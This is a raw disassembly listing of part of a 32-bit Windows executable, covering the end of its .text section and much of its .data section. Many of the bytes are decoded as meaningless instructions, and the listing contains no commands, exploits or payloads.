  41cbbd:	imul   DWORD PTR [edx+0x38]
  41cbc0:	lea    edx,[ecx]
  41cbc2:	xchg   edx,eax
  41cbc3:	fwait
  41cbc4:	adc    al,0x5d
  41cbc6:	call   0x6295:0x5478638d
  41cbcd:	repnz fsub st(5),st
  41cbd0:	mov    esi,fs
  41cbd2:	xchg   DWORD PTR [ebx+0x3],ebp
  41cbd5:	in     al,dx
  41cbd6:	mov    eax,0xe4088674
  41cbdb:	test   eax,0x8638063d
  41cbe0:	ret    0x78c6
  41cbe3:	nop
  41cbe4:	cli    
  41cbe5:	xchg   edx,eax
  41cbe6:	dec    edx
  41cbe7:	mov    al,0xb4
  41cbe9:	fisttp QWORD PTR [ecx]
  41cbeb:	retf   0x3901
  41cbee:	jecxz  0x41cb7b
  41cbf0:	xor    esp,eax
  41cbf2:	push   edx
  41cbf3:	pop    ds
  41cbf4:	ds add bl,bh
  41cbf7:	mov    BYTE PTR gs:[eax+0x3fd4e935],ah
  41cbfe:	ret    
  41cbff:	cmp    al,dh
  41cc01:	jnp    0x41cbdb
  41cc03:	ret    0x6a5c
  41cc06:	jo     0x41cc29
  41cc08:	sub    eax,0x8b91f6b6
  41cc0d:	test   BYTE PTR [ecx+0x67fba7a5],ch
  41cc13:	ret    0xd3b6
  41cc16:	jl     0x41cbae
  41cc18:	jmp    0xdbc35256
  41cc1d:	outs   dx,BYTE PTR ds:[esi]
  41cc1e:	lods   eax,DWORD PTR ds:[esi]
  41cc1f:	arpl   cx,dx
  41cc21:	inc    esp
  41cc22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc23:	and    al,dl
  41cc25:	repnz outs dx,BYTE PTR ds:[esi]
  41cc27:	adc    ebp,ebx
  41cc29:	cmp    BYTE PTR ds:0xed3cebea,ch
  41cc2f:	(bad)  
  41cc30:	(bad)  
  41cc31:	mov    bh,0xfc
  41cc33:	pop    esi
  41cc34:	xchg   edx,eax
  41cc35:	inc    edi
  41cc36:	popf   
  41cc37:	fimul  DWORD PTR [edi+eiz*1]
  41cc3a:	sbb    bl,dh
  41cc3c:	das    
  41cc3d:	leave  
  41cc3e:	dec    edi
  41cc3f:	pop    eax
  41cc40:	enter  0x67dd,0xf3
  41cc44:	scas   al,BYTE PTR es:[edi]
  41cc45:	call   0x398d:0xa22e26ad
  41cc4c:	jg     0x41cc3e
  41cc4e:	jp     0x41cbdb
  41cc50:	inc    edx
  41cc51:	cdq    
  41cc52:	adc    eax,0x8b22893e
  41cc57:	mov    esp,0x108b23d5
  41cc5c:	mov    al,ds:0xb6094d62
  41cc61:	pop    esi
  41cc62:	push   ss
  41cc63:	cmp    BYTE PTR [eax],cl
  41cc65:	add    DWORD PTR [ebx+0x5ce7c9ed],0x78205f48
  41cc6f:	test   al,0x5d
  41cc71:	retf   
  41cc72:	lods   eax,DWORD PTR ds:[esi]
  41cc73:	fdivp  st(4),st
  41cc75:	mov    esi,0x4a66b91d
  41cc7a:	ret    0x44cd
  41cc7d:	mov    bh,0x3c
  41cc7f:	sub    eax,0x6864d255
  41cc84:	inc    eax
  41cc85:	mov    ?,WORD PTR [ebx+0x5f]
  41cc88:	into   
  41cc89:	lods   al,BYTE PTR ds:[esi]
  41cc8a:	in     al,dx
  41cc8b:	inc    ebp
  41cc8c:	stos   DWORD PTR es:[edi],eax
  41cc8d:	pop    ebp
  41cc8e:	mov    BYTE PTR [ebx+0x40937d66],bh
  41cc94:	(bad)  
  41cc95:	adc    DWORD PTR [edi+0x6fed6952],esi
  41cc9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc9c:	dec    ecx
  41cc9d:	sub    ah,al
  41cc9f:	(bad)  [edx+0x34]
  41cca2:	retf   
  41cca3:	push   eax
  41cca4:	test   ah,ah
  41cca6:	mov    ch,0x4e
  41cca8:	bound  esi,QWORD PTR [edx-0x6]
  41ccab:	mov    ds:0x68401228,eax
  41ccb0:	bound  esi,QWORD PTR [edx+0x77]
  41ccb3:	jb     0x41cd09
  41ccb5:	daa    
  41ccb6:	push   eax
  41ccb7:	mov    ?,WORD PTR ds:0x220bc0b4
  41ccbd:	ret    
  41ccbe:	lea    eax,[edi+0x52]
  41ccc1:	popa   
  41ccc2:	dec    esp
  41ccc3:	outs   dx,DWORD PTR ds:[esi]
  41ccc4:	sbb    al,0xff
  41ccc6:	inc    ebx
  41ccc7:	retf   0x22e6
  41ccca:	sub    eax,0xec4e157
  41cccf:	xchg   esp,eax
  41ccd0:	push   esp
  41ccd1:	in     eax,0xd4
  41ccd3:	cdq    
  41ccd4:	jmp    0x41ccf2
  41ccd6:	retf   0x392d
  41ccd9:	jmp    0x6da6c036
  41ccde:	jno    0x41ccde
  41cce0:	bound  esp,QWORD PTR [edi]
  41cce2:	js     0x41cd14
  41cce4:	lods   al,BYTE PTR fs:[esi]
  41cce6:	mov    ebx,0x30bac7a5
  41cceb:	cmp    BYTE PTR [edx],dl
  41cced:	push   es
  41ccee:	stos   BYTE PTR es:[edi],al
  41ccef:	outs   dx,DWORD PTR ds:[esi]
  41ccf0:	add    al,dh
  41ccf2:	adc    edi,DWORD PTR [eax]
  41ccf4:	jnp    0x41ccad
  41ccf6:	and    ah,BYTE PTR [ebx+ebp*2-0x18446a4b]
  41ccfd:	lea    eax,[esi]
  41ccff:	int    0x6c
  41cd01:	scas   al,BYTE PTR es:[edi]
  41cd02:	test   DWORD PTR [eax],edx
  41cd04:	cmc    
  41cd05:	sbb    al,BYTE PTR [edi-0x5b5f77bf]
  41cd0b:	adc    al,0xb8
  41cd0d:	adc    ecx,ecx
  41cd0f:	jne    0x41ccfc
  41cd11:	aaa    
  41cd12:	cmp    DWORD PTR [ecx+0x2b92dfd],esi
  41cd18:	mov    DWORD PTR [edi+0x25],edi
  41cd1b:	cmp    eax,0x8aec97ab
  41cd20:	test   eax,0x5ff8aed
  41cd25:	stos   DWORD PTR es:[edi],eax
  41cd26:	sahf   
  41cd27:	mov    ah,0x3f
  41cd29:	icebp  
  41cd2a:	xchg   esp,edi
  41cd2c:	mov    esp,0x411a5ad4
  41cd31:	inc    esi
  41cd32:	xor    esi,eax
  41cd34:	xchg   ebx,eax
  41cd35:	(bad)  
  41cd37:	xor    eax,0x239e878
  41cd3c:	xlat   BYTE PTR ds:[ebx]
  41cd3d:	aad    0xe6
  41cd3f:	loop   0x41ccd2
  41cd41:	push   edx
  41cd42:	adc    ah,BYTE PTR [esi-0x29]
  41cd45:	jmp    0x9c597dd2
  41cd4a:	push   cs
  41cd4b:	test   DWORD PTR [esi+esi*2+0x6c5c4196],ebp
  41cd52:	(bad)  
  41cd53:	sbb    BYTE PTR [ebx+0x3b9686e],bl
  41cd59:	jecxz  0x41cd5d
  41cd5b:	(bad)  
  41cd5c:	xor    cl,BYTE PTR [edx]
  41cd5e:	xchg   ebp,eax
  41cd5f:	add    BYTE PTR [eax+0x490e8f19],cl
  41cd65:	scas   al,BYTE PTR es:[edi]
  41cd66:	(bad)  
  41cd67:	or     BYTE PTR [edi],cl
  41cd69:	pop    ebx
  41cd6a:	leave  
  41cd6b:	ret    0x10

Disassembly of section .data:

0041d000 <.data>:
  41d000:	sbb    cl,bl
  41d002:	add    DWORD PTR [eax],eax
  41d004:	fld    DWORD PTR es:[ecx]
  41d007:	add    BYTE PTR [eax],dh
  41d009:	fld    DWORD PTR [ecx]
  41d00b:	add    BYTE PTR [edx],bh
  41d00d:	fld    DWORD PTR [ecx]
  41d00f:	add    BYTE PTR [edx-0x27],al
  41d012:	add    DWORD PTR [eax],eax
  41d014:	dec    esp
  41d015:	fld    DWORD PTR [ecx]
  41d017:	add    BYTE PTR [eax-0x27],bl
  41d01a:	add    DWORD PTR [eax],eax
  41d01c:	(bad)  
  41d01d:	fld    DWORD PTR [ecx]
  41d01f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d023:	add    BYTE PTR [eax-0x27],bh
  41d026:	add    DWORD PTR [eax],eax
  41d028:	sbb    cl,0x1
  41d02b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d031:	fld    DWORD PTR [ecx]
  41d033:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d039:	fld    DWORD PTR [ecx]
  41d03b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d042:	add    DWORD PTR [eax],eax
  41d044:	rcr    cl,1
  41d046:	add    DWORD PTR [eax],eax
  41d048:	loopne 0x41d023
  41d04a:	add    DWORD PTR [eax],eax
  41d04c:	jmp    0x1d9:0xf80001d9
  41d053:	add    BYTE PTR [edx+ebx*8],al
  41d056:	add    DWORD PTR [eax],eax
  41d058:	push   cs
  41d059:	fiadd  DWORD PTR [ecx]
  41d05b:	add    BYTE PTR [edx],bl
  41d05d:	fiadd  DWORD PTR [ecx]
  41d05f:	add    BYTE PTR [edx+ebx*8],ah
  41d062:	add    DWORD PTR [eax],eax
  41d064:	fiadd  DWORD PTR cs:[ecx]
  41d067:	add    BYTE PTR [eax],bh
  41d069:	fiadd  DWORD PTR [ecx]
  41d06b:	add    BYTE PTR [eax-0x26],al
  41d06e:	add    DWORD PTR [eax],eax
  41d070:	dec    esi
  41d071:	fiadd  DWORD PTR [ecx]
  41d073:	add    BYTE PTR [eax-0x26],bl
  41d076:	add    DWORD PTR [eax],eax
  41d078:	fiadd  DWORD PTR fs:[ecx]
  41d07b:	add    BYTE PTR [esi-0x26],ch
  41d07e:	add    DWORD PTR [eax],eax
  41d080:	js     0x41d05c
  41d082:	add    DWORD PTR [eax],eax
  41d084:	xchg   dl,bl
  41d086:	add    DWORD PTR [eax],eax
  41d088:	mov    ds,edx
  41d08a:	add    DWORD PTR [eax],eax
  41d08c:	call   0x1da:0xa40001da
  41d093:	add    BYTE PTR [esi-0x47fffe26],ch
  41d099:	fiadd  DWORD PTR [ecx]
  41d09b:	add    ah,cl
  41d09d:	fiadd  DWORD PTR [ecx]
  41d09f:	add    ah,bl
  41d0a1:	fiadd  DWORD PTR [ecx]
  41d0a3:	add    al,ch
  41d0a5:	fiadd  DWORD PTR [ecx]
  41d0a7:	add    dl,dh
  41d0a9:	fiadd  DWORD PTR [ecx]
  41d0ab:	add    ah,bh
  41d0ad:	fiadd  DWORD PTR [ecx]
  41d0af:	add    BYTE PTR [eax],al
  41d0b1:	add    BYTE PTR [eax],al
  41d0b3:	add    BYTE PTR [edx],dl
  41d0b5:	fild   DWORD PTR [ecx]
  41d0b7:	add    BYTE PTR [eax],dh
  41d0b9:	fild   DWORD PTR [ecx]
  41d0bb:	add    BYTE PTR [eax-0x25],cl
  41d0be:	add    DWORD PTR [eax],eax
  41d0c0:	push   0x7a0001db
  41d0c5:	fild   DWORD PTR [ecx]
  41d0c7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d0cd:	fild   DWORD PTR [ecx]
  41d0cf:	add    dl,al
  41d0d1:	fild   DWORD PTR [ecx]
  41d0d3:	add    dh,dl
  41d0d5:	fild   DWORD PTR [ecx]
  41d0d7:	add    dh,ah
  41d0d9:	fild   DWORD PTR [ecx]
  41d0db:	add    BYTE PTR [edx],al
  41d0dd:	fadd   QWORD PTR [ecx]
  41d0df:	add    BYTE PTR [esp+ebx*8],bl
  41d0e2:	add    DWORD PTR [eax],eax
  41d0e4:	sub    al,0xdc
  41d0e6:	add    DWORD PTR [eax],eax
  41d0e8:	cmp    bl,ah
  41d0ea:	add    DWORD PTR [eax],eax
  41d0ec:	dec    esi
  41d0ed:	fadd   QWORD PTR [ecx]
  41d0ef:	add    BYTE PTR [edx-0x24],bl
  41d0f2:	add    DWORD PTR [eax],eax
  41d0f4:	data16 fadd QWORD PTR [ecx]
  41d0f7:	add    BYTE PTR [eax-0x24],bh
  41d0fa:	add    DWORD PTR [eax],eax
  41d0fc:	mov    bl,ah
  41d0fe:	add    DWORD PTR [eax],eax
  41d100:	pushf  
  41d101:	fadd   QWORD PTR [ecx]
  41d103:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d109:	fadd   QWORD PTR [ecx]
  41d10b:	add    ah,cl
  41d10d:	fadd   QWORD PTR [ecx]
  41d10f:	add    al,ah
  41d111:	fadd   QWORD PTR [ecx]
  41d113:	add    ah,dh
  41d115:	fadd   QWORD PTR [ecx]
  41d117:	add    BYTE PTR [esi],al
  41d119:	fld    QWORD PTR [ecx]
  41d11b:	add    BYTE PTR [esi],dl
  41d11d:	fld    QWORD PTR [ecx]
  41d11f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d126:	add    DWORD PTR [eax],eax
  41d128:	dec    edx
  41d129:	fld    QWORD PTR [ecx]
  41d12b:	add    BYTE PTR [eax-0x23],bl
  41d12e:	add    DWORD PTR [eax],eax
  41d130:	pusha  
  41d131:	fld    QWORD PTR [ecx]
  41d133:	add    BYTE PTR [esi-0x23],ch
  41d136:	add    DWORD PTR [eax],eax
  41d138:	test   ch,bl
  41d13a:	add    DWORD PTR [eax],eax
  41d13c:	mov    ds,ebp
  41d13e:	add    DWORD PTR [eax],eax
  41d140:	sahf   
  41d141:	fld    QWORD PTR [ecx]
  41d143:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d14a:	add    DWORD PTR [eax],eax
  41d14c:	fcmovu st,st(5)
  41d14e:	add    DWORD PTR [eax],eax
  41d150:	out    dx,al
  41d151:	fld    QWORD PTR [ecx]
  41d153:	add    ah,bh
  41d155:	fld    QWORD PTR [ecx]
  41d157:	add    BYTE PTR [eax],cl
  41d159:	fiadd  WORD PTR [ecx]
  41d15b:	add    BYTE PTR [eax],ah
  41d15d:	fiadd  WORD PTR [ecx]
  41d15f:	add    BYTE PTR [edx],dh
  41d161:	fiadd  WORD PTR [ecx]
  41d163:	add    BYTE PTR [edx-0x22],cl
  41d166:	add    DWORD PTR [eax],eax
  41d168:	pop    esp
  41d169:	fiadd  WORD PTR [ecx]
  41d16b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d16f:	add    BYTE PTR [edx-0x71fffe22],al
  41d175:	fiadd  WORD PTR [ecx]
  41d177:	add    BYTE PTR [edx+0x1de],ah
  41d17d:	add    BYTE PTR [eax],al
  41d17f:	add    al,al
  41d181:	fiadd  WORD PTR [ecx]
  41d183:	add    dl,cl
  41d185:	fiadd  WORD PTR [ecx]
  41d187:	add    ah,dl
  41d189:	fiadd  WORD PTR [ecx]
  41d18b:	add    al,ah
  41d18d:	fiadd  WORD PTR [ecx]
  41d18f:	add    ah,dh
  41d191:	fiadd  WORD PTR [ecx]
  41d193:	add    BYTE PTR [eax],al
  41d195:	fild   WORD PTR [ecx]
  41d197:	add    BYTE PTR [edx],bl
  41d199:	fild   WORD PTR [ecx]
  41d19b:	add    BYTE PTR [edx],ch
  41d19d:	fild   WORD PTR [ecx]
  41d19f:	add    BYTE PTR [eax],bh
  41d1a1:	fild   WORD PTR [ecx]
  41d1a3:	add    BYTE PTR [eax-0x21],dl
  41d1a6:	add    DWORD PTR [eax],eax
  41d1a8:	fild   WORD PTR fs:[ecx]
  41d1ab:	add    BYTE PTR [esi-0x21],bh
  41d1ae:	add    DWORD PTR [eax],eax
  41d1b0:	mov    edi,ds
  41d1b2:	add    DWORD PTR [eax],eax
  41d1b4:	cwde   
  41d1b5:	fild   WORD PTR [ecx]
  41d1b7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d1bd:	fild   WORD PTR [ecx]
  41d1bf:	add    dh,al
  41d1c1:	fild   WORD PTR [ecx]
  41d1c3:	add    dh,dl
  41d1c5:	fild   WORD PTR [ecx]
  41d1c7:	add    dh,ah
  41d1c9:	fild   WORD PTR [ecx]
  41d1cb:	add    ah,bh
  41d1cd:	fild   WORD PTR [ecx]
  41d1cf:	add    BYTE PTR [eax],cl
  41d1d1:	loopne 0x41d1d4
  41d1d3:	add    BYTE PTR [eax+eiz*8],dl
  41d1d6:	add    DWORD PTR [eax],eax
  41d1d8:	sub    al,ah
  41d1da:	add    DWORD PTR [eax],eax
  41d1dc:	ds loopne 0x41d1e0
  41d1df:	add    BYTE PTR [esi-0x20],dl
  41d1e2:	add    DWORD PTR [eax],eax
  41d1e4:	data16 loopne 0x41d1e8
  41d1e7:	add    BYTE PTR [edx-0x20],dh
  41d1ea:	add    DWORD PTR [eax],eax
  41d1ec:	xchg   al,ah
  41d1ee:	add    DWORD PTR [eax],eax
  41d1f0:	xchg   esp,eax
  41d1f1:	loopne 0x41d1f4
  41d1f3:	add    BYTE PTR [esi-0x47fffe20],ch
  41d1f9:	loopne 0x41d1fc
  41d1fb:	add    dl,cl
  41d1fd:	loopne 0x41d200
  41d1ff:	add    ah,bl
  41d201:	loopne 0x41d204
  41d203:	add    dh,ch
  41d205:	loopne 0x41d208
  41d207:	add    dh,bh
  41d209:	loopne 0x41d20c
  41d20b:	add    BYTE PTR [eax],cl
  41d20d:	loope  0x41d210
  41d20f:	add    BYTE PTR [esi],bl
  41d211:	loope  0x41d214
  41d213:	add    BYTE PTR [edx],dh
  41d215:	loope  0x41d218
  41d217:	add    BYTE PTR [esi-0x1f],al
  41d21a:	add    DWORD PTR [eax],eax
  41d21c:	push   esi
  41d21d:	loope  0x41d220
  41d21f:	add    BYTE PTR [esi-0x1f],ah
  41d222:	add    DWORD PTR [eax],eax
  41d224:	jb     0x41d207
  41d226:	add    DWORD PTR [eax],eax
  41d228:	test   cl,ah
  41d22a:	add    DWORD PTR [eax],eax
  41d22c:	mov    al,ds:0xb60001e1
  41d231:	loope  0x41d234
  41d233:	add    dl,al
  41d235:	loope  0x41d238
  41d237:	add    dh,dl
  41d239:	loope  0x41d23c
  41d23b:	add    BYTE PTR [eax],al
  41d23d:	add    BYTE PTR [eax],al
  41d23f:	add    ah,dh
  41d241:	loope  0x41d244
  41d243:	add    BYTE PTR [edx+eiz*8],al
  41d246:	add    DWORD PTR [eax],eax
  41d248:	adc    al,0xe2
  41d24a:	add    DWORD PTR [eax],eax
  41d24c:	and    ah,dl
  41d24e:	add    DWORD PTR [eax],eax
  41d250:	xor    dl,ah
  41d252:	add    DWORD PTR [eax],eax
  41d254:	ds loop 0x41d258
  41d257:	add    BYTE PTR [edx-0x1e],dl
  41d25a:	add    DWORD PTR [eax],eax
  41d25c:	pusha  
  41d25d:	loop   0x41d260
  41d25f:	add    BYTE PTR [edx-0x1e],bh
  41d262:	add    DWORD PTR [eax],eax
  41d264:	xchg   dl,ah
  41d266:	add    DWORD PTR [eax],eax
  41d268:	cwde   
  41d269:	loop   0x41d26c
  41d26b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d272:	add    DWORD PTR [eax],eax
  41d274:	int3   
  41d275:	loop   0x41d278
  41d277:	add    dh,dl
  41d279:	loop   0x41d27c
  41d27b:	add    al,ah
  41d27d:	loop   0x41d280
  41d27f:	add    dl,bh
  41d281:	loop   0x41d284
  41d283:	add    BYTE PTR [edx],cl
  41d285:	jecxz  0x41d288
  41d287:	add    BYTE PTR [edx],bl
  41d289:	jecxz  0x41d28c
  41d28b:	add    BYTE PTR [ebx+eiz*8],ah
  41d28e:	add    DWORD PTR [eax],eax
  41d290:	xor    al,0xe3
  41d292:	add    DWORD PTR [eax],eax
  41d294:	inc    eax
  41d295:	jecxz  0x41d298
  41d297:	add    BYTE PTR [esi-0x1d],cl
  41d29a:	add    DWORD PTR [eax],eax
  41d29c:	fs jecxz 0x41d2a0
  41d29f:	add    BYTE PTR [esi-0x1d],dh
  41d2a2:	add    DWORD PTR [eax],eax
  41d2a4:	mov    fs,ebx
  41d2a6:	add    DWORD PTR [eax],eax
  41d2a8:	mov    ds:0xb00001e3,al
  41d2ad:	jecxz  0x41d2b0
  41d2af:	add    dl,al
  41d2b1:	jecxz  0x41d2b4
  41d2b3:	add    dh,cl
  41d2b5:	jecxz  0x41d2b8
  41d2b7:	add    dh,bl
  41d2b9:	jecxz  0x41d2bc
  41d2bb:	add    ah,ch
  41d2bd:	jecxz  0x41d2c0
  41d2bf:	add    BYTE PTR [eax],al
  41d2c1:	in     al,0x1
  41d2c3:	add    BYTE PTR [esi],cl
  41d2c5:	in     al,0x1
  41d2c7:	add    BYTE PTR [edx],ch
  41d2c9:	in     al,0x1
  41d2cb:	add    BYTE PTR [esp+eiz*8],bh
  41d2ce:	add    DWORD PTR [eax],eax
  41d2d0:	dec    esp
  41d2d1:	in     al,0x1
  41d2d3:	add    BYTE PTR [esi-0x1c],bl
  41d2d6:	add    DWORD PTR [eax],eax
  41d2d8:	push   0xffffffe4
  41d2da:	add    DWORD PTR [eax],eax
  41d2dc:	jl     0x41d2c2
  41d2de:	add    DWORD PTR [eax],eax
  41d2e0:	mov    ah,ah
  41d2e2:	add    DWORD PTR [eax],eax
  41d2e4:	cwde   
  41d2e5:	in     al,0x1
  41d2e7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d2ed:	in     al,0x1
  41d2ef:	add    al,dl
  41d2f1:	in     al,0x1
  41d2f3:	add    dl,ah
  41d2f5:	in     al,0x1
  41d2f7:	add    al,dh
  41d2f9:	in     al,0x1
  41d2fb:	add    BYTE PTR [eax],cl
  41d2fd:	in     eax,0x1
  41d2ff:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d306:	add    DWORD PTR [eax],eax
  41d308:	ds in  eax,0x1
  41d30b:	add    BYTE PTR [edx-0x1b],cl
  41d30e:	add    DWORD PTR [eax],eax
  41d310:	pop    edx
  41d311:	in     eax,0x1
  41d313:	add    BYTE PTR [esi-0x1b],ch
  41d316:	add    DWORD PTR [eax],eax
  41d318:	jle    0x41d2ff
  41d31a:	add    DWORD PTR [eax],eax
  41d31c:	nop
  41d31d:	in     eax,0x1
  41d31f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d326:	add    DWORD PTR [eax],eax
  41d328:	mov    eax,0xca0001e5
  41d32d:	in     eax,0x1
  41d32f:	add    dl,bl
  41d331:	in     eax,0x1
  41d333:	add    dh,ah
  41d335:	in     eax,0x1
  41d337:	add    ah,bh
  41d339:	in     eax,0x1
  41d33b:	add    BYTE PTR [esi],cl
  41d33d:	out    0x1,al
  41d33f:	add    BYTE PTR [eax],ch
  41d341:	out    0x1,al
  41d343:	add    BYTE PTR [edx],bh
  41d345:	out    0x1,al
  41d347:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d34b:	add    BYTE PTR [eax-0x1a],bl
  41d34e:	add    DWORD PTR [eax],eax
  41d350:	push   0x7a0001e6
  41d355:	out    0x1,al
  41d357:	add    BYTE PTR [esi-0x67fffe1a],al
  41d35d:	out    0x1,al
  41d35f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d365:	out    0x1,al
  41d367:	add    ah,bl
  41d369:	out    0x1,al
  41d36b:	add    dl,ch
  41d36d:	out    0x1,al
  41d36f:	add    al,bh
  41d371:	out    0x1,al
  41d373:	add    BYTE PTR [esi],cl
  41d375:	out    0x1,eax
  41d377:	add    BYTE PTR [esi],bl
  41d379:	out    0x1,eax
  41d37b:	add    BYTE PTR [edx],ch
  41d37d:	out    0x1,eax
  41d37f:	add    BYTE PTR [edx],bh
  41d381:	out    0x1,eax
  41d383:	add    BYTE PTR [edx-0x19],cl
  41d386:	add    DWORD PTR [eax],eax
  41d388:	pop    esp
  41d389:	out    0x1,eax
  41d38b:	add    BYTE PTR [eax-0x19],ch
  41d38e:	add    DWORD PTR [eax],eax
  41d390:	jbe    0x41d379
  41d392:	add    DWORD PTR [eax],eax
  41d394:	xchg   bh,ah
  41d396:	add    DWORD PTR [eax],eax
  41d398:	cwde   
  41d399:	out    0x1,eax
  41d39b:	add    BYTE PTR [eax-0x45fffe19],ch
  41d3a1:	out    0x1,eax
  41d3a3:	add    al,dl
  41d3a5:	out    0x1,eax
  41d3a7:	add    dh,ah
  41d3a9:	out    0x1,eax
  41d3ab:	add    dh,dh
  41d3ad:	out    0x1,eax
  41d3af:	add    BYTE PTR [edx],al
  41d3b1:	call   0xe859d3b7
  41d3b6:	add    DWORD PTR [eax],eax
  41d3b8:	and    al,0xe8
  41d3ba:	add    DWORD PTR [eax],eax
  41d3bc:	xor    al,0xe8
  41d3be:	add    DWORD PTR [eax],eax
  41d3c0:	dec    eax
  41d3c1:	call   0xe897d3c7
  41d3c6:	add    DWORD PTR [eax],eax
  41d3c8:	callw  0xd3cd
  41d3cc:	jp     0x41d3b6
  41d3ce:	add    DWORD PTR [eax],eax
  41d3d0:	xchg   al,ch
  41d3d2:	add    DWORD PTR [eax],eax
  41d3d4:	xchg   esi,eax
  41d3d5:	call   0xe8e3d3db
  41d3da:	add    DWORD PTR [eax],eax
  41d3dc:	mov    dl,0xe8
  41d3de:	add    DWORD PTR [eax],eax
  41d3e0:	(bad)  
  41d3e1:	call   0xe913d3e7
  41d3e6:	add    DWORD PTR [eax],eax
  41d3e8:	in     al,0xe8
  41d3ea:	add    DWORD PTR [eax],eax
  41d3ec:	lock call 0xe93fd3f3
  41d3f2:	add    DWORD PTR [eax],eax
  41d3f4:	or     al,0xe9
  41d3f6:	add    DWORD PTR [eax],eax
  41d3f8:	sbb    ch,cl
  41d3fa:	add    DWORD PTR [eax],eax
  41d3fc:	add    BYTE PTR [eax],al
  41d3fe:	add    BYTE PTR [eax],al
  41d400:	or     al,0x2
  41d402:	add    BYTE PTR [eax+0x0],al
  41d408:	add    BYTE PTR [eax],al
  41d40a:	add    BYTE PTR [eax],al
  41d40c:	das    
  41d40d:	and    DWORD PTR [ecx*2+0x0],edx
  41d414:	add    al,BYTE PTR [eax]
  41d416:	add    BYTE PTR [eax],al
  41d418:	pop    ebp
  41d419:	add    BYTE PTR [eax],al
  41d41b:	add    BYTE PTR [ebx+ebp*4+0x2],dl
  41d41f:	add    BYTE PTR [ebp+ebx*4+0x2],dl
	...
  41d42b:	add    BYTE PTR [edi],ch
  41d42d:	and    DWORD PTR [ecx*2+0x0],edx
  41d434:	pop    edx
  41d435:	aam    0x1
  41d437:	add    BYTE PTR [ecx],al
  41d439:	add    BYTE PTR [eax],al
  41d43b:	add    BYTE PTR [ecx],al
  41d43d:	add    BYTE PTR [eax],al
  41d43f:	add    BYTE PTR [ecx],al
  41d441:	add    BYTE PTR [eax],al
  41d443:	add    BYTE PTR [eax-0x2c],dl
  41d446:	add    DWORD PTR [eax],eax
  41d448:	push   esp
  41d449:	aam    0x1
  41d44b:	add    BYTE PTR [eax-0x2c],bl
  41d44e:	add    DWORD PTR [eax],eax
  41d450:	xchg   edi,eax
  41d451:	inc    ebx
  41d452:	add    BYTE PTR [eax],al
  41d454:	imul   edx,esp,0x1
  41d457:	add    BYTE PTR [eax],al
  41d459:	add    BYTE PTR [eax+ebp*2+0x58],ah
  41d45d:	xor    dl,BYTE PTR [eax+0x78]
  41d460:	jp     0x41d4aa
  41d462:	jp     0x41d4d5
  41d464:	outs   dx,BYTE PTR ds:[esi]
  41d465:	je     0x41d495
  41d467:	je     0x41d4d2
  41d469:	jo     0x41d46b
  41d46b:	aas    
  41d46c:	dec    eax
  41d46d:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  41d475:	gs jb  0x41d4c7
  41d478:	jb     0x41d4e3
  41d47a:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  41d482:	inc    edi
  41d483:	inc    esi
  41d484:	dec    ebx
  41d485:	push   eax
  41d486:	inc    ecx
  41d487:	dec    ecx
  41d488:	push   eax
  41d489:	inc    ecx
  41d48a:	inc    esp
  41d48b:	cmp    al,0x56
	...
  41d495:	add    BYTE PTR [eax],al
  41d497:	add    BYTE PTR [eax],dl
  41d499:	aad    0x1
	...
  41d4a3:	add    BYTE PTR [esi],al
  41d4a5:	fild   DWORD PTR [ecx]
  41d4a7:	add    BYTE PTR [eax],al
  41d4a9:	rol    BYTE PTR [ecx],1
  41d4ab:	add    ah,al
  41d4ad:	aad    0x1
	...
  41d4b7:	add    BYTE PTR [edx-0x4bfffe22],dh
  41d4bd:	rol    BYTE PTR [ecx],1
  41d4bf:	add    BYTE PTR [eax+0x1d6],dl
  41d4c5:	add    BYTE PTR [eax],al
  41d4c7:	add    BYTE PTR [eax],al
  41d4c9:	add    BYTE PTR [eax],al
  41d4cb:	add    dl,ch
  41d4cd:	loope  0x41d4d0
  41d4cf:	add    BYTE PTR [eax+0x500001d1],al
  41d4d5:	xlat   BYTE PTR ds:[ebx]
  41d4d6:	add    DWORD PTR [eax],eax
	...
  41d4e0:	ss jmp 0xd281d4e7
  41d4e6:	add    DWORD PTR [eax],eax
  41d4e8:	adc    cl,bl
  41d4ea:	add    DWORD PTR [eax],eax
	...
  41d4f4:	inc    edx
  41d4f5:	jmp    0xd441d4fb
  41d4fa:	add    DWORD PTR [eax],eax
	...
  41d510:	sbb    cl,bl
  41d512:	add    DWORD PTR [eax],eax
  41d514:	fld    DWORD PTR es:[ecx]
  41d517:	add    BYTE PTR [eax],dh
  41d519:	fld    DWORD PTR [ecx]
  41d51b:	add    BYTE PTR [edx],bh
  41d51d:	fld    DWORD PTR [ecx]
  41d51f:	add    BYTE PTR [edx-0x27],al
  41d522:	add    DWORD PTR [eax],eax
  41d524:	dec    esp
  41d525:	fld    DWORD PTR [ecx]
  41d527:	add    BYTE PTR [eax-0x27],bl
  41d52a:	add    DWORD PTR [eax],eax
  41d52c:	(bad)  
  41d52d:	fld    DWORD PTR [ecx]
  41d52f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d533:	add    BYTE PTR [eax-0x27],bh
  41d536:	add    DWORD PTR [eax],eax
  41d538:	sbb    cl,0x1
  41d53b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d541:	fld    DWORD PTR [ecx]
  41d543:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d549:	fld    DWORD PTR [ecx]
  41d54b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d552:	add    DWORD PTR [eax],eax
